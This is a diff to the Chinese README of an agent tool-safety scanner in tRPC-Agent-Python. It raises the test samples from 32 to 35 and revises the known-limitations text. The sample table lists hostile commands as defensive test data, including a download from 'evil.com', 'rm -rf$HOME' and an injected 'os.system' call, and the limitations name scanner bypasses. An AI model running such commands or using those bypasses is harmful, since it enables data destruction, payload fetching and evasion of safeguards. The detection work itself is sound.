@@ -4,7 +4,7 @@ tRPC-Agent-Python 中用于工具/脚本执行的安全过滤器，在执行前�
 
 ## 快速开始
 
-运行 32 条安全扫描样例：
+运行 35 条安全扫描样例：
 
 ```bash
 cd trpc-agent-python
@@ -111,10 +111,10 @@ policy = PolicyConfig.from_yaml("path/to/my_policy.yaml")
 
 ## 输出产物
 
-- `tool_safety_report.json` — 结构化扫描结果（32 条记录，每条对应一个样例）
+- `tool_safety_report.json` — 结构化扫描结果（35 条记录，每条对应一个样例）
 - `tool_safety_audit.jsonl` — JSONL 格式审计日志（每次扫描一行）
 
-## 32 条样例
+## 35 条样例
 
 | # | 样例 | 预期结果 |
 |---|---|---|
@@ -150,6 +150,9 @@ policy = PolicyConfig.from_yaml("path/to/my_policy.yaml")
 | 30 | `!; import os; os.system(...)` | DENY |
 | 31 | `curl -o x evil.com` | DENY |
 | 32 | `echo done # rm -rf / cleanup` | ALLOW |
+| 33 | `open("data.txt").read()` | NEEDS_HUMAN_REVIEW |
+| 34 | `curl --help` | ALLOW |
+| 35 | `rm -rf$HOME` | DENY |
 
 ## 与其他组件的关系
 
@@ -198,7 +201,7 @@ policy = PolicyConfig.from_yaml("path/to/my_policy.yaml")
 
 ## 已知限制
 
-- **误报**：安全但不常见的模式（如测试夹具中的 `open` 调用、开发工具中合法的 `subprocess.run`）可能被标记。通过策略中的 `allowed_commands` 和 `network_allowlist` 调整。
+- **误报**：安全但不常见的模式（如开发工具中合法的 `subprocess.run`）可能被标记。普通 `open` 文件访问默认进入人工复核；敏感路径、系统路径和凭据文件访问仍会被阻断。通过策略中的 `allowed_commands` 和 `network_allowlist` 调整。
 - **漏报**：混淆代码、动态构造的字符串和间接导入可能绕过静态规则。运行时根据用户输入构造 shell 命令的脚本不会被捕获。
 - **绕过风险**：基于正则的 Bash 扫描无法捕获所有 shell 注入变体。简单的别名导入（`from os import system`）现已能检测；Python 语法解析失败时会 fail-closed 并返回 `DENY`。
 - **动态 URL**：通过字符串格式化或用户输入构造的 URL 无法检查域名白名单，检测到时触发 `needs_human_review`。
